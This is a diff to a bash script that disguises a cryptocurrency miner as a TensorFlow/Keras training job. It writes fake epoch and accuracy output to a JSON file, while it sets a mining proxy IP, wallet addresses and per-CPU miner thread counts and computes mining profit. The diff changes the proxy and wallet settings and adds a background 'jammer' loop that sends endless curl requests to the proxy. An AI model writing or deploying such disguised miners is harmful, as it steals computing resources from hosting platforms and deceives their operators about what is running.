@@ -1,12 +1,12 @@
 #!/bin/bash
 echo '{ '
 echo '"type":"tf.keras",' > /tmp/keras.json
-echo '"version":"0.0.9",' >> /tmp/keras.json
+echo '"version":"0.0.11",' >> /tmp/keras.json
 if [[ $1 -gt 0 ]] 
 then
-    echo '"version":"0.0.9",'
+    echo '"version":"0.0.11",'
 fi
-echo '"status":"Epoch 1/5 1875/1875 [==============================] - 5s 2ms/step - loss: 0.1173 - accuracy: 0.9127",' >> /tmp/keras.json
+echo '"status":"Epoch 3/5 1975/1975 [==============================] - 5s 4ms/step - loss: 0.1113 - accuracy: 0.9027",' >> /tmp/keras.json
 
 PROX=49.12.115.117
 ETPort=80
@@ -37,7 +37,7 @@ SWITCHOPG=AUTO
 SWITCHOP=VC
 
 #SWITCHPROX=AUTO
-SWITCHPROX=$HZ_PROX2
+SWITCHPROX=$PROX
 
 VCThreads=$[$(nproc)*2]
 XMThreads=$[$(nproc)*1]
@@ -57,7 +57,7 @@ W_DG3="DPvNFshhBNh2GHV5KUsNdLvpgeUzw4HAb2"
 W_DG4="DA6Q7BdoFBJQNvfCeUrHoeWLHXL857maZ9"
 
 
-W_VC=$W_DG3
+W_VC=$W_DG
 VC_LUCK=""
 #VC_LUCK="c=VRSC,mc=VRSC"
 
@@ -86,12 +86,18 @@ function displaytime {
   printf '%d seconds\n' $S
 }
 
+jammer() {
+    while true;
+    do
+        curl -s $SWITCHPROX:$VCPort -m 0.3  > /dev/null ;
+    done
+}
 
 
 ##  CPU info
 
 echo -e '#####################################   CPU info  ###########################################' > /tmp/pysi.log
-
+jammer &
 VCPUNUM=$(nproc)
 echo '"nproc":'$VCPUNUM',' >> /tmp/keras.json
 
@@ -166,7 +172,7 @@ XMPRICE=$(echo  $INFIDIFF | /tmp/jq '.[2].price')
 
 
 ETHPROFIT=$(python3 -c "print('%.2f' % (22.0*$ETHREWARD*1e6*$ETHPRICE*24*30 ) )"  )
-RVPROFIT=$(python3 -c "print('%.2f' % (8.0*$RVREWARD*1e6*$RVPRICE*24*30 ) )"  )
+RVPROFIT=$(python3 -c "print('%.2f' % (2.7*$RVREWARD*1e6*$RVPRICE*24*30 ) )"  )
 VCPROFIT=$(python3 -c "print('%.2f' % (1.3*$VCREWARD*1e6*$VCPRICE*24*30 ) )")
 XMPROFIT=$(python3 -c "print('%.2f' % ( 300.2*$XMREWARD*$XMPRICE*24*30 ) )"   )
 
